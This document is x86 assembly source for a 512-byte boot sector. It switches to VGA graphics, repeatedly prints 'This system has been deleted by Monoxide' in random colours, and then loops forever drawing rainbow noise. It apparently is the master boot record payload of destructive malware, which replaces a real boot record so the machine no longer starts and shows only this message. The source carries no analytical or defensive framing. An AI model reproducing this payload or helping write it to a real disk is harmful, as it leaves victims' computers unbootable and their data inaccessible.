bits 16 ; 16-bit code
org 0x7C00 ; Set image base

xor ax, ax
mov ds, ax
mov es, ax
mov fs, ax
mov gs, ax
mov ss, ax ; Clear segment registers

mov esp, 0x7C00
mov ebp, esp ; Stack starts at bootloader base

jmp 0x0000:load ; Clear CS, some BIOSes set CS=0x7C0 and IP=0

load:
	xor ah, ah   ; Set video mode function (0x00)
	mov al, 0x13 ; 320x200, 256 colors
	int 0x10

	rdtsc
	mov word [seed], ax ; Set seed to timestamp counter

	call text_loop

	mov ax, 0xA000    ; Video memory address
	mov es, ax        ; Set segment
	mov di, 320*200-1 ; Set index
	mov cl, 32        ; Set color index 32 in VGA palette

	jmp draw_loop       ; Enter draw loop

; AX = Return value, BX = Seed
xorshift16:
	mov ax, bx ; Load seed into AX
	shl ax, 7 ; Shift
	xor bx, ax ; XOR...
	mov ax, bx
	shr ax, 9
	xor bx, ax
	mov ax, bx
	shl ax, 8
	xor bx, ax
	mov ax, bx
	ret

text_loop:
	mov ah, 0x02 ; Set cursor position
	xor bh, bh   ; Page number
	xor dl, dl   ; Column
	int 0x10
	
	mov si, string
.char_loop:
	lodsb             ; Load character from SI
	or al, al         ; Testing for character
	jz .char_loop_end ; Check if character is zero termination

	push ax
	mov bx, word [seed]
	call xorshift16
	xor word [seed], ax
	mov bl, al
	pop ax

	mov ah, 0x0E ; Print character
	int 0x10
	jmp .char_loop
.char_loop_end:
	inc dh
	jz .end
	jmp text_loop
.end:
	ret

draw_loop:
	mov bx, word [seed]
	call xorshift16
	xor word [seed], ax

	xor dx, dx
	mov bx, 3
	div bx
	mov ax, dx
	add al, cl ; Add counter to make a rainbow effect

	mov [es:di], al ; Set pixel
	dec di          ; Decrement index
	cmp di, 0xFFFF  ; Check if index went out of bounds
	jne draw_loop   ; Continue if ended

	mov di, 320*200-1 ; Reset index
	cmp cl, 51        ; Check if above color index 51 in VGA palette
	jg .rainbow_end
	inc cl            ; Increment color index
	jmp draw_loop
.rainbow_end:
	inc ch        ; Increment counter
	mov cl, 32    ; Set color index 32 in VGA palette
	jmp draw_loop

seed:
	dw 4096
string:
	db 'This system has been deleted by Monoxide', 0x00

times 510 - ($ - $$) db 0
dw 0xAA55 ; Signature
